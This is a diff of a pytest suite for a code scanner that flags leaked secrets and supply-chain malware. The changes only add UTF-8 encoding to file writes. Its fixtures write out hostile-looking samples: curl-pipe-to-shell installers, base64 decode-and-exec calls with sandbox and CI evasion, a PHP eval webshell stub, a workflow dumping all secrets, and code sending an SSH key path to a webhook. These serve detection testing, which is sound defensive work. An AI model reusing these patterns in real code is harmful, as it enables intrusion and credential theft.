@@ -6172,7 +6231,7 @@ class TestATranslationIsNotACredentialInAnyScript:
         # the assignment pattern will not start a name after a `.`, so
         # `spring.datasource.password=` has never matched and still does not.
         (tmp_path / "application.properties").write_text(
-            "datasource_password=Xk9mQ2vB7wRtY4uZp1Ls\n"
+            "datasource_password=Xk9mQ2vB7wRtY4uZp1Ls\n", encoding="utf-8"
         )
         assert self._hits(tmp_path)
 
@@ -6193,7 +6252,8 @@ class TestAUuidIsWeakerEvidenceThanAToken:
         (tmp_path / "compose.yaml").write_text(
             "services:\n  app:\n    environment:\n"
             "      - SESSION_SECRET=141a0668-fd9b-4f4e-b5d0-1b0aa8202c5b\n"
-            "      - API_TOKEN=Xk9mQ2vB7wRtY4uZp1LsDy3Fz6Hj0Cg5\n"
+            "      - API_TOKEN=Xk9mQ2vB7wRtY4uZp1LsDy3Fz6Hj0Cg5\n",
+            encoding="utf-8",
         )
         by_name = {
             f.explanation.summary: f
@@ -6224,7 +6284,7 @@ class TestABundleWithoutABundleName:
     def test_a_minified_file_is_build_output(self, tmp_path) -> None:
         static = tmp_path / "static" / "js"
         static.mkdir(parents=True)
-        (static / "main.js").write_text(self.LONG)
+        (static / "main.js").write_text(self.LONG, encoding="utf-8")
         hits = [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -6234,7 +6294,9 @@ class TestABundleWithoutABundleName:
         assert all(f.severity <= Severity.MEDIUM for f in hits)
 
     def test_the_same_assignment_on_its_own_line_still_blocks(self, tmp_path) -> None:
-        (tmp_path / "app.js").write_text('const TOKEN = "Xk9mQ2vB7wRtY4uZp1LsDy3Fz6Hj";\n')
+        (tmp_path / "app.js").write_text(
+            'const TOKEN = "Xk9mQ2vB7wRtY4uZp1LsDy3Fz6Hj";\n', encoding="utf-8"
+        )
         assert [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -6270,7 +6332,8 @@ class TestARouteIsNotAKey:
         (tmp_path / "tool_models.py").write_text(
             "class Endpoint:\n"
             '    REMOVE_PASSWORD = "/api/v1/security/remove-password"\n'
-            '    ADD_PASSWORD = "/api/v1/security/add-password"\n'
+            '    ADD_PASSWORD = "/api/v1/security/add-password"\n',
+            encoding="utf-8",
         )
         assert not [
             f
@@ -6283,7 +6346,8 @@ class TestARouteIsNotAKey:
         trailing underscore and no leading slash, and it stays a finding."""
         (tmp_path / "backend.go").write_text(
             "const clientSecret = "
-            '"GC7UDZ3Ra4jLcmfQSagKCDJ1JEy-mU6pBBhFrS3tDEHILrK7j3TQHUrglkO5SgZ_"\n'
+            '"GC7UDZ3Ra4jLcmfQSagKCDJ1JEy-mU6pBBhFrS3tDEHILrK7j3TQHUrglkO5SgZ_"\n',
+            encoding="utf-8",
         )
         assert [
             f
@@ -6372,10 +6436,11 @@ class TestSeventyRepositoriesOneEach:
         telemetry event: the name, spelled the way the wire spells it."""
         (tmp_path / "keys.kt").write_text(
             'private const val V2_UPGRADE_TOKEN = "v2UpgradeToken"\n'
-            'private const val SERVER_PASSWORD1 = "serverPassword1"\n'
+            'private const val SERVER_PASSWORD1 = "serverPassword1"\n',
+            encoding="utf-8",
         )
         (tmp_path / "events.ts").write_text(
-            "  TOKEN_STORAGE_INITIALIZATION = 'token_storage_initialization',\n"
+            "  TOKEN_STORAGE_INITIALIZATION = 'token_storage_initialization',\n", encoding="utf-8"
         )
         assert not [
             f
@@ -6401,7 +6466,8 @@ class TestSeventyRepositoriesOneEach:
 
     def test_a_bcrypt_hash_in_a_seed_file(self, tmp_path) -> None:
         (tmp_path / "seed.php").write_text(
-            "<?php\n$password = '$2a$12$uKw0MYV.LEA64Y6Cux1UIO2YpJ00P6TqUta4YYhNdnnqElRXrZIiC';\n"
+            "<?php\n$password = '$2a$12$uKw0MYV.LEA64Y6Cux1UIO2YpJ00P6TqUta4YYhNdnnqElRXrZIiC';\n",
+            encoding="utf-8",
         )
         assert not [
             f
@@ -6439,9 +6505,11 @@ class TestTheSeverityARuleDeclares:
         for n in range(bare):
             packages[f"node_modules/bare{n}"] = {"version": "1.0.0", "dev": True}
         (tmp_path / "package-lock.json").write_text(
-            json.dumps({"name": "p", "lockfileVersion": 3, "packages": packages})
+            json.dumps({"name": "p", "lockfileVersion": 3, "packages": packages}), encoding="utf-8"
         )
-        (tmp_path / "package.json").write_text('{"name": "p", "version": "1.0.0"}')
+        (tmp_path / "package.json").write_text(
+            '{"name": "p", "version": "1.0.0"}', encoding="utf-8"
+        )
 
     def test_the_declared_severity_is_what_is_reported(self, tmp_path) -> None:
         self._lock(tmp_path, hashed=10, bare=3)
@@ -6499,7 +6567,8 @@ class TestAPinCountsForItsOwnCommand:
             "FROM debian:12\n"
             "ARG NODE_MAJOR=22\n"
             'RUN curl -fsSL "https://deb.nodesource.com/setup_${NODE_MAJOR}.x" | bash -\n'
-            "RUN curl -fsSL https://get.tool.invalid/install.sh | sh -s -- -y\n"
+            "RUN curl -fsSL https://get.tool.invalid/install.sh | sh -s -- -y\n",
+            encoding="utf-8",
         )
         hits = self._fetch(tmp_path, "SUSPECT.CONTAINER.FETCH_EXEC.001")
         assert [f for f in hits if f.severity >= Severity.HIGH]
@@ -6508,7 +6577,8 @@ class TestAPinCountsForItsOwnCommand:
         (tmp_path / "Dockerfile").write_text(
             "FROM debian:12\n"
             "ARG NODE_MAJOR=22\n"
-            'RUN curl -fsSL "https://deb.nodesource.com/setup_${NODE_MAJOR}.x" | bash -\n'
+            'RUN curl -fsSL "https://deb.nodesource.com/setup_${NODE_MAJOR}.x" | bash -\n',
+            encoding="utf-8",
         )
         hits = self._fetch(tmp_path, "SUSPECT.CONTAINER.FETCH_EXEC.001")
         assert hits and all(f.severity <= Severity.MEDIUM for f in hits)
@@ -6522,7 +6592,8 @@ class TestAPinCountsForItsOwnCommand:
             "RUN curl -fsSL -o /tmp/tool.tgz https://example.test/tool.tgz \\\n"
             ' && echo "${SUM}  /tmp/tool.tgz" | sha256sum -c - \\\n'
             " && tar -xzf /tmp/tool.tgz -C /usr/local \\\n"
-            " && chmod +x /usr/local/bin/tool\n"
+            " && chmod +x /usr/local/bin/tool\n",
+            encoding="utf-8",
         )
         hits = self._fetch(tmp_path, "SUSPECT.CONTAINER.FETCH_EXEC.001")
         assert all(f.severity <= Severity.MEDIUM for f in hits)
@@ -6539,7 +6610,8 @@ class TestAPinCountsForItsOwnCommand:
             '          echo "installing forc"\n'
             "          curl -sSLf https://example.test/sway/releases/download/"
             "v${{ env.FORC_VERSION }}/forc.tar.gz -L -o forc.tar.gz\n"
-            "          chmod +x forc-binaries/forc\n"
+            "          chmod +x forc-binaries/forc\n",
+            encoding="utf-8",
         )
         hits = self._fetch(tmp_path, "SUSPECT.CI.FETCH_EXEC.001")
         assert hits and all(f.severity <= Severity.MEDIUM for f in hits)
@@ -6636,7 +6708,8 @@ class TestThreeRulesThatAskedTooLittle:
             "    >>> async with aiohttp.request('GET', 'http://python.org/') as resp:\n"
             "    ...     body = await resp.read()\n"
             "    >>> exec(compile(body, 'x', 'exec'))\n"
-            '"""\n\n\ndef fetch(url):\n    return url\n'
+            '"""\n\n\ndef fetch(url):\n    return url\n',
+            encoding="utf-8",
         )
         assert Scanner().scan(tmp_path).findings == ()
 
@@ -6648,7 +6721,8 @@ class TestThreeRulesThatAskedTooLittle:
             "ENV GITNESS_TOKEN_COOKIE_NAME=token\n"
             "ENV SA_PASSWORD=$MSSQL_PASSWORD\n"
             "ARG SCCACHE_S3_NO_CREDENTIALS=0\n"
-            "ENV DB_PASSWORD=Xk9mQ2vB7wRtY4uZp1Ls\n"
+            "ENV DB_PASSWORD=Xk9mQ2vB7wRtY4uZp1Ls\n",
+            encoding="utf-8",
         )
         hits = [
             f
@@ -6672,7 +6746,8 @@ class TestThreeRulesThatAskedTooLittle:
             "    if: github.event.pull_request.user.login == 'dependabot[bot]'\n"
             "    runs-on: ubuntu-latest\n"
             "    steps:\n      - uses: actions/checkout@v7\n"
-            "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
+            "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n",
+            encoding="utf-8",
         )
         hits = [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.CI.PR_TARGET.001"
@@ -6690,7 +6765,8 @@ class TestThreeRulesThatAskedTooLittle:
             "jobs:\n  write:\n    runs-on: ubuntu-latest\n"
             "    steps:\n      - uses: actions/checkout@v7\n"
             "        with:\n          ref: ${{ github.event.pull_request.head.ref }}\n"
-            "      - run: npx prettier --write .\n"
+            "      - run: npx prettier --write .\n",
+            encoding="utf-8",
         )
         assert [
             f
@@ -6731,7 +6807,8 @@ class TestPipingIntoAProgramIsNotPipingIntoAnInterpreter:
             'SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"\n'
             'arg0="curl -fsSL https://code-server.test/install.sh | sh -s --"\n'
             'check_prereq bun "Install: curl -fsSL https://bun.test/install | bash"\n'
-            "decoded=$(printf '%s' \"$BLOB\" | base64 -d)\n"
+            "decoded=$(printf '%s' \"$BLOB\" | base64 -d)\n",
+            encoding="utf-8",
         )
         assert all(f.severity <= Severity.MEDIUM for f in self._dropper(tmp_path))
 
@@ -6742,7 +6819,8 @@ class TestPipingIntoAProgramIsNotPipingIntoAnInterpreter:
             "PCRE_LATEST=$(curl -Ls -I $PCRE_SOURCE"
             " | perl -lne 'if(m|tag/pcre2-(\\d+.\\d+)|){print $1;exit(0)}')\n"
             "PCAP_LATEST=$(curl -Ls $PCAP_SOURCE"
-            " | perl -lne 'if(/libpcap-([\\d.]+).tar.gz/){print $1}')\n"
+            " | perl -lne 'if(/libpcap-([\\d.]+).tar.gz/){print $1}')\n",
+            encoding="utf-8",
         )
         assert self._dropper(tmp_path) == []
 
@@ -6752,7 +6830,8 @@ class TestPipingIntoAProgramIsNotPipingIntoAnInterpreter:
             "#!/usr/bin/env bash\n"
             'SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"\n'
             "curl -fsSL https://opencode.test/install | bash\n"
-            "decoded=$(printf '%s' \"$BLOB\" | base64 -d)\n"
+            "decoded=$(printf '%s' \"$BLOB\" | base64 -d)\n",
+            encoding="utf-8",
         )
         assert [f for f in self._dropper(tmp_path) if f.severity >= Severity.HIGH]
 
@@ -6764,7 +6843,8 @@ class TestPipingIntoAProgramIsNotPipingIntoAnInterpreter:
             "#!/usr/bin/env bash\n"
             "set -euo pipefail\n"
             "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.test | sh -s -- -y\n"
-            "curl -LsSf https://astral.test/uv/install.sh | sh\n"
+            "curl -LsSf https://astral.test/uv/install.sh | sh\n",
+            encoding="utf-8",
         )
         # Reported, at the severity a script a person runs carries: `--fail-on medium` blocks
         # it, and the same line in an install hook or a pipeline blocks by default.
@@ -6793,7 +6873,8 @@ class TestHelpTextIsNotAPipelineStep:
             " (curl | bash one-liner), or desktop-installer@latest'\n"
             "    required: false\n"
             "runs:\n  using: composite\n  steps:\n"
-            "    - run: echo ready\n      shell: bash\n"
+            "    - run: echo ready\n      shell: bash\n",
+            encoding="utf-8",
         )
         assert not [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001"
@@ -6804,7 +6885,8 @@ class TestHelpTextIsNotAPipelineStep:
         workflows.mkdir(parents=True)
         (workflows / "ci.yml").write_text(
             "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
-            "      - run: curl -LsSf https://astral.test/uv/install.sh | sh\n"
+            "      - run: curl -LsSf https://astral.test/uv/install.sh | sh\n",
+            encoding="utf-8",
         )
         assert [
             f
@@ -6821,7 +6903,8 @@ class TestHelpTextIsNotAPipelineStep:
             "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
             "      - run: |\n"
             "          echo installing\n"
-            "          curl -fsSL https://opencode.test/install | bash\n"
+            "          curl -fsSL https://opencode.test/install | bash\n",
+            encoding="utf-8",
         )
         assert [
             f
@@ -6949,7 +7032,8 @@ class TestAskingWhichCloudIsNotAskingWhoIsWatching:
             "                    return name\n"
             '    return "UNKNOWN"\n\n'
             "def report(data):\n"
-            '    requests.post("https://stats.example.test/u", json=data)\n'
+            '    requests.post("https://stats.example.test/u", json=data)\n',
+            encoding="utf-8",
         )
         assert self._anti(tmp_path) == []
 
@@ -6960,7 +7044,8 @@ class TestAskingWhichCloudIsNotAskingWhoIsWatching:
             'with open("/sys/class/dmi/id/product_name") as handle:\n'
             '    if "VirtualBox" in handle.read() or "QEMU" in handle.read():\n'
             "        raise SystemExit(0)\n\n"
-            'subprocess.run(base64.b64decode(b"ZWNobyBoaQ==").decode(), shell=True)\n'
+            'subprocess.run(base64.b64decode(b"ZWNobyBoaQ==").decode(), shell=True)\n',
+            encoding="utf-8",
         )
         assert self._anti(tmp_path)
 
@@ -6977,7 +7062,8 @@ class TestAskingWhichCloudIsNotAskingWhoIsWatching:
             "export async function load(url: string) {\n"
             "  const response = await fetch(url);\n"
             "  return WebAssembly.instantiate(await response.arrayBuffer(), imports);\n"
-            "}\n"
+            "}\n",
+            encoding="utf-8",
         )
         assert self._anti(tmp_path) == []
 
@@ -6991,7 +7077,8 @@ class TestAskingWhichCloudIsNotAskingWhoIsWatching:
             "export async function check(url: string) {\n"
             "  const body = await fetch(url);\n"
             "  return Buffer.from(await body.text(), 'base64');\n"
-            "}\n"
+            "}\n",
+            encoding="utf-8",
         )
         assert self._anti(tmp_path) == []
 
@@ -7002,7 +7089,8 @@ class TestAskingWhichCloudIsNotAskingWhoIsWatching:
             "import base64\nimport os\nimport subprocess\nimport sys\n\n"
             'if os.environ.get("CI"):\n'
             "    sys.exit(0)\n\n"
-            'subprocess.run(base64.b64decode(b"ZWNobyBoaQ==").decode(), shell=True)\n'
+            'subprocess.run(base64.b64decode(b"ZWNobyBoaQ==").decode(), shell=True)\n',
+            encoding="utf-8",
         )
         assert self._anti(tmp_path)
 
@@ -7033,14 +7121,16 @@ class TestAPemBlockTooSmallToBeAKey:
     def test_twelve_characters_of_mash(self, tmp_path) -> None:
         (tmp_path / "action.rb").write_text(
             "      key_content: "
-            '"-----BEGIN EC PRIVATE KEY-----\\nfewfawefawfe\\n-----END EC PRIVATE KEY-----"\n'
+            '"-----BEGIN EC PRIVATE KEY-----\\nfewfawefawfe\\n-----END EC PRIVATE KEY-----"\n',
+            encoding="utf-8",
         )
         assert self._keys(tmp_path) == []
 
     def test_an_openapi_example_annotation(self, tmp_path) -> None:
         (tmp_path / "admin.rs").write_text(
             '    #[schema(value_type = String, example = "-----BEGIN RSA PRIVATE KEY-----'
-            '\\n897238huhbsdbjh12==\\n-----END RSA PRIVATE KEY-----")]\n'
+            '\\n897238huhbsdbjh12==\\n-----END RSA PRIVATE KEY-----")]\n',
+            encoding="utf-8",
         )
         assert self._keys(tmp_path) == []
 
@@ -7048,7 +7138,8 @@ class TestAPemBlockTooSmallToBeAKey:
         (tmp_path / "GoogleApi.credentials.ts").write_text(
             "\t\t\t\tdefault:\n"
             "\t\t\t\t\t'-----BEGIN PRIVATE KEY-----\\nXIYEvQIBADANBg<...>0IhA7TMoGYPQc="
-            "\\n-----END PRIVATE KEY-----\\n',\n"
+            "\\n-----END PRIVATE KEY-----\\n',\n",
+            encoding="utf-8",
         )
         assert self._keys(tmp_path) == []
 
@@ -7057,7 +7148,7 @@ class TestAPemBlockTooSmallToBeAKey:
         larger: the shortest real private key there is sits just above it."""
         body = "\n".join(["MC4CAQAwBQYDK2VwBCIEIH3kQ9mZ2xT7vL4nR8wYaB3kQ9mZ2xT7vL4nR8wYq1Ls"] * 3)
         (tmp_path / "deploy_key").write_text(
-            f"-----BEGIN PRIVATE KEY-----\n{body}\n-----END PRIVATE KEY-----\n"
+            f"-----BEGIN PRIVATE KEY-----\n{body}\n-----END PRIVATE KEY-----\n", encoding="utf-8"
         )
         assert [f for f in self._keys(tmp_path) if f.severity >= Severity.HIGH]
 
@@ -7102,7 +7193,7 @@ class TestAOneLinerThatOnlyTalks:
         import subprocess
 
         (tmp_path / "package.json").write_text(
-            json.dumps({"name": "p", "version": "1.0.0", "scripts": scripts})
+            json.dumps({"name": "p", "version": "1.0.0", "scripts": scripts}), encoding="utf-8"
         )
         # A git root, because `_is_first_party` asks whether the scan target IS one --
         # without it every manifest reads as a downloaded package and the severity under
@@ -7283,7 +7374,7 @@ class TestAKeyNamedPlaceholderSaysWhatItsValueIs:
 
     @staticmethod
     def _rules(tmp_path, text: str) -> set[str]:
-        (tmp_path / "Settings.tsx").write_text(text)
+        (tmp_path / "Settings.tsx").write_text(text, encoding="utf-8")
         return {f.rule_id for f in Scanner().scan(tmp_path).findings}
 
     @pytest.mark.parametrize(
@@ -7319,7 +7410,7 @@ class TestTheAlphabetInsideAProviderPrefix:
 
     @staticmethod
     def _rules(tmp_path, text: str) -> set[str]:
-        (tmp_path / "README.md").write_text(text)
+        (tmp_path / "README.md").write_text(text, encoding="utf-8")
         return {f.rule_id for f in Scanner().scan(tmp_path).findings}
 
     def test_a_documented_stripe_key_is_the_alphabet(self, tmp_path) -> None:
@@ -7342,7 +7433,7 @@ class TestThePublicHalfOfASignature:
 
     @staticmethod
     def _rules(tmp_path, text: str) -> set[str]:
-        (tmp_path / "data.csv").write_text(text)
+        (tmp_path / "data.csv").write_text(text, encoding="utf-8")
         return {f.rule_id for f in Scanner().scan(tmp_path).findings}
 
     def test_a_key_id_in_a_presigned_url_is_not_a_leak(self, tmp_path) -> None:
@@ -7437,7 +7528,8 @@ class TestATriggerIsAKeyAndNotAString:
             "      - uses: actions/checkout@v4\n"
             "        with:\n"
             "          ref: ${{ github.event.pull_request.head.sha }}\n"
-            "      - run: npm install && npm run build\n"
+            "      - run: npm install && npm run build\n",
+            encoding="utf-8",
         )
         return {f.rule_id for f in Scanner().scan(tmp_path).findings}
 
@@ -7538,22 +7630,29 @@ class TestARustTestModuleIsNotACapability:
     def test_a_fixture_in_a_test_module_is_not_a_drop_point(self, tmp_path) -> None:
         crate = tmp_path / "crates" / "protocol"
         (crate / "src").mkdir(parents=True)
-        (tmp_path / "Cargo.toml").write_text('[workspace]\nmembers = ["crates/protocol"]\n')
-        (crate / "Cargo.toml").write_text('[package]\nname = "protocol"\nversion = "0.1.0"\n')
-        (crate / "src" / "fleet.rs").write_text(self.FIXTURE)
+        (tmp_path / "Cargo.toml").write_text(
+            '[workspace]\nmembers = ["crates/protocol"]\n', encoding="utf-8"
+        )
+        (crate / "Cargo.toml").write_text(
+            '[package]\nname = "protocol"\nversion = "0.1.0"\n', encoding="utf-8"
+        )
+        (crate / "src" / "fleet.rs").write_text(self.FIXTURE, encoding="utf-8")
         assert "SUSPECT.EXFIL.DROP_POINT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_same_pair_outside_the_module_still_is(self, tmp_path) -> None:
         """The control. Nothing changed but the four lines that put it in the tests."""
         crate = tmp_path / "crates" / "protocol"
         (crate / "src").mkdir(parents=True)
-        (crate / "Cargo.toml").write_text('[package]\nname = "protocol"\nversion = "0.1.0"\n')
+        (crate / "Cargo.toml").write_text(
+            '[package]\nname = "protocol"\nversion = "0.1.0"\n', encoding="utf-8"
+        )
         (crate / "src" / "fleet.rs").write_text(
             "pub fn ship() {\n"
             '    let identity = "~/.ssh/codewhale_fleet";\n'
             '    let hook = "https://hooks.slack.com/services/T0/B0/xxxx";\n'
             "    post(hook, identity);\n"
-            "}\n"
+            "}\n",
+            encoding="utf-8",
         )
         assert "SUSPECT.EXFIL.DROP_POINT.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
@@ -7697,7 +7796,7 @@ class TestAnAccessKeyIdIsNotACredential:
 
     @staticmethod
     def _aws(tmp_path, text: str) -> list:
-        (tmp_path / "jobs.yml").write_text(text)
+        (tmp_path / "jobs.yml").write_text(text, encoding="utf-8")
         return [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.AWS.ACCESS_KEY.001"
         ]
@@ -7824,7 +7923,7 @@ class TestSixNamesAreNotAComputedName:
         assert self._dispatch(self.PROBE) == []
 
     def test_the_whole_file_is_silent_about_it(self, tmp_path) -> None:
-        (tmp_path / "setup.py").write_text("import os\n\n" + self.PROBE)
+        (tmp_path / "setup.py").write_text("import os\n\n" + self.PROBE, encoding="utf-8")
         assert "MALWARE.DYNAMIC_DISPATCH.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
@@ -7858,7 +7957,7 @@ class TestACommentedOutPackerIsNotPackedCode:
 
     @staticmethod
     def _rules(tmp_path, text: str) -> set[str]:
-        (tmp_path / "widget.js").write_text(text)
+        (tmp_path / "widget.js").write_text(text, encoding="utf-8")
         return {f.rule_id for f in Scanner().scan(tmp_path).findings}
 
     def test_behind_a_line_comment_it_is_not_reported(self, tmp_path) -> None:
@@ -8083,7 +8182,7 @@ class TestATokenInAUrlIsASignedLink:
 
     @staticmethod
     def _findings(tmp_path, text: str) -> list:
-        (tmp_path / "streams.m3u").write_text(text)
+        (tmp_path / "streams.m3u").write_text(text, encoding="utf-8")
         return [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -8194,7 +8293,7 @@ class TestVendoredCodeIsSomebodyElsesReview:
     def _severities(tmp_path, relative: str, source: str) -> list:
         target = tmp_path / relative
         target.parent.mkdir(parents=True, exist_ok=True)
-        target.write_text(source)
+        target.write_text(source, encoding="utf-8")
         return [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -8226,7 +8325,7 @@ class TestAKeyInAnAndroidManifestShipsInTheApk:
 
     @staticmethod
     def _rules(tmp_path, name: str, body: str) -> set[str]:
-        (tmp_path / name).write_text(body)
+        (tmp_path / name).write_text(body, encoding="utf-8")
         return {f.rule_id for f in Scanner().scan(tmp_path).findings}
 
     def test_a_manifest_key_is_client_configuration(self, tmp_path) -> None:
@@ -8261,7 +8360,7 @@ class TestFirebasesWebConfigSaysItIsPublic:
 
     @staticmethod
     def _rules(tmp_path, body: str) -> set[str]:
-        (tmp_path / ".env.production").write_text(body)
+        (tmp_path / ".env.production").write_text(body, encoding="utf-8")
         return {f.rule_id for f in Scanner().scan(tmp_path).findings}
 
     def test_the_config_object_is_not_a_leak(self, tmp_path) -> None:
@@ -8496,7 +8595,7 @@ class TestADocstringIsProseInAString:
 
     @staticmethod
     def _rules(tmp_path, source: str) -> set[str]:
-        (tmp_path / "forensics.py").write_text(source)
+        (tmp_path / "forensics.py").write_text(source, encoding="utf-8")
         return ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_word_in_a_docstring_is_not_a_check(self, tmp_path) -> None:
@@ -8664,14 +8763,16 @@ class TestABacktickInProseIsNotACommand:
         (tmp_path / "Page.php").write_text(
             "<?php\n"
             "$patterns = ['`' . $token[0] . '([A-Za-z0-9+/]+={0,2})' . $token[1] . '`mu'];\n"
-            "$raw = base64_decode($match[1]);\n"
+            "$raw = base64_decode($match[1]);\n",
+            encoding="utf-8",
         )
         assert "SUSPECT.DECODE_EXEC.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_substitution_in_double_quotes_still_runs(self, tmp_path) -> None:
         """The control, and the reason the test asks WHICH quote."""
         (tmp_path / "run.sh").write_text(
-            '#!/bin/sh\nblob=$(cat payload.b64)\nout="`echo $blob | base64 -d`"\neval "$out"\n'
+            '#!/bin/sh\nblob=$(cat payload.b64)\nout="`echo $blob | base64 -d`"\neval "$out"\n',
+            encoding="utf-8",
         )
         assert "SUSPECT.DECODE_EXEC.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
@@ -8814,7 +8915,8 @@ class TestAPrepareScriptCannotReachAConsumer:
     @staticmethod
     def _findings(tmp_path, scripts: str) -> list:
         (tmp_path / "package.json").write_text(
-            '{\n  "name": "x",\n  "version": "1.0.0",\n  "scripts": {\n' + scripts + "\n  }\n}\n"
+            '{\n  "name": "x",\n  "version": "1.0.0",\n  "scripts": {\n' + scripts + "\n  }\n}\n",
+            encoding="utf-8",
         )
         return [
             f
@@ -9020,7 +9122,7 @@ class TestTheClassThatTurnedUpNothing:
         the host, the finding says so, and a project that needs it has a baseline entry
         with a justification -- which is the distinction this whole pass was drawing."""
         (tmp_path / "docker-compose.yml").write_text(
-            "services:\n  runner:\n    image: alpine:3.20\n    privileged: true\n"
+            "services:\n  runner:\n    image: alpine:3.20\n    privileged: true\n", encoding="utf-8"
         )
         assert "SUSPECT.IAC.PRIVILEGED.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
@@ -9035,7 +9137,7 @@ class TestTheClassThatTurnedUpNothing:
         demo = tmp_path / "demo-setups"
         demo.mkdir()
         (demo / "docker-compose.yml").write_text(
-            "services:\n  runner:\n    image: alpine:3.20\n    privileged: true\n"
+            "services:\n  runner:\n    image: alpine:3.20\n    privileged: true\n", encoding="utf-8"
         )
         found = [
             f
@@ -9148,7 +9250,7 @@ class TestTheSameQuestionThroughABase64Layer:
         """`db-password: ZGJwYXNzd29yZDEx` is `dbpassword11`, which is the key's own name
         and two digits -- the question `value_restates_the_name` asks, one encoding away
         from where it could ask it."""
-        (tmp_path / "values.yaml").write_text("db-password: ZGJwYXNzd29yZDEx\n")
+        (tmp_path / "values.yaml").write_text("db-password: ZGJwYXNzd29yZDEx\n", encoding="utf-8")
         assert "SECRET.GENERIC.ASSIGNMENT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
 
@@ -9164,7 +9266,7 @@ class TestATypeAliasDefinesAName:
 
     @staticmethod
     def _rules(tmp_path, name: str, body: str) -> set[str]:
-        (tmp_path / name).write_text(body)
+        (tmp_path / name).write_text(body, encoding="utf-8")
         return ReviewDefectsHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
@@ -9322,7 +9424,8 @@ class TestASleepInALoopIsAHeartbeat:
             "def serve(blob):\n"
             "    subprocess.run(base64.b64decode(blob), shell=True)\n"
             "    while True:\n"
-            "        time.sleep(3600)\n"
+            "        time.sleep(3600)\n",
+            encoding="utf-8",
         )
         assert "SUSPECT.ANTI_ANALYSIS.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
@@ -9340,7 +9443,8 @@ class TestASleepInALoopIsAHeartbeat:
             "import base64, subprocess, time\n\n\n"
             "def serve(blob):\n"
             "    time.sleep(3600)\n"
-            "    subprocess.run(base64.b64decode(blob), shell=True)\n"
+            "    subprocess.run(base64.b64decode(blob), shell=True)\n",
+            encoding="utf-8",
         )
         rules = ReviewDefectsHelpers.flagged(tmp_path)
         assert "SUSPECT.ANTI_ANALYSIS.001" not in rules
@@ -9354,7 +9458,8 @@ class TestASleepInALoopIsAHeartbeat:
             "def serve(blob):\n"
             "    if os.environ.get('CI'):\n"
             "        sys.exit(0)\n"
-            "    subprocess.run(base64.b64decode(blob), shell=True)\n"
+            "    subprocess.run(base64.b64decode(blob), shell=True)\n",
+            encoding="utf-8",
         )
         assert "SUSPECT.ANTI_ANALYSIS.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
@@ -9424,13 +9529,15 @@ class TestWhatTheThirteenthPassConfirmed:
         (flows / "vulnerable.yml").write_text(
             "on: push\njobs:\n  go:\n    runs-on: ubuntu-latest\n    steps:\n"
             "      - run: env\n        env:\n"
-            "          ALLMYSECRETS: ${{ toJSON(secrets) }}\n"
+            "          ALLMYSECRETS: ${{ toJSON(secrets) }}\n",
+            encoding="utf-8",
         )
         assert "MALWARE.CI.SECRET_EXFIL.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_php_webshell(self, tmp_path) -> None:
         (tmp_path / "w.php").write_text(
-            "<?php\n@eval(gzinflate(base64_decode('c29tZXRoaW5nIGVsc2UgZW50aXJlbHk=')));\n"
+            "<?php\n@eval(gzinflate(base64_decode('c29tZXRoaW5nIGVsc2UgZW50aXJlbHk=')));\n",
+            encoding="utf-8",
         )
         rules = ReviewDefectsHelpers.flagged(tmp_path)
         assert "SUSPECT.DECODE_CHAIN.001" in rules or "SUSPECT.DECODE_EXEC.001" in rules
@@ -9544,7 +9651,8 @@ class TestADelayIsNotACheck:
             'if os.environ.get("CI") or socket.gethostname() == "analysis-01":\n'
             "    sys.exit(0)\n\n"
             'subprocess.run(base64.b64decode(b"ZWNobyB4"), shell=True)\n\n'
-            'setup(name="x", version="1.0.0")\n'
+            'setup(name="x", version="1.0.0")\n',
+            encoding="utf-8",
         )
         assert "MALWARE.ANTI_ANALYSIS.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
@@ -9578,7 +9686,7 @@ class TestHelpTextTheCommandPrints:
 
     @staticmethod
     def _rules(tmp_path, name: str, body: str) -> set[str]:
-        (tmp_path / name).write_text(body)
+        (tmp_path / name).write_text(body, encoding="utf-8")
         return ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_cobra_example_block_is_help_text(self, tmp_path) -> None:
@@ -9688,14 +9796,15 @@ class TestGrafanasDefaultSecretKey:
     VALUE: ClassVar[str] = "SW2YcwTIb9zpOOhoPsMm"
 
     def test_the_published_default_is_not_a_leak(self, tmp_path) -> None:
-        (tmp_path / "defaults.ini").write_text(f";secret_key = {self.VALUE}\n")
+        (tmp_path / "defaults.ini").write_text(f";secret_key = {self.VALUE}\n", encoding="utf-8")
         assert "SECRET.GENERIC.ASSIGNMENT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_and_not_in_the_check_that_detects_it_either(self, tmp_path) -> None:
         (tmp_path / "step.go").write_text(
             "package configchecks\n\nconst (\n"
             "\t// nolint:gosec // Defined in defaults.ini originally\n"
-            f'\tdefaultSecretKey = "{self.VALUE}"\n)\n'
+            f'\tdefaultSecretKey = "{self.VALUE}"\n)\n',
+            encoding="utf-8",
         )
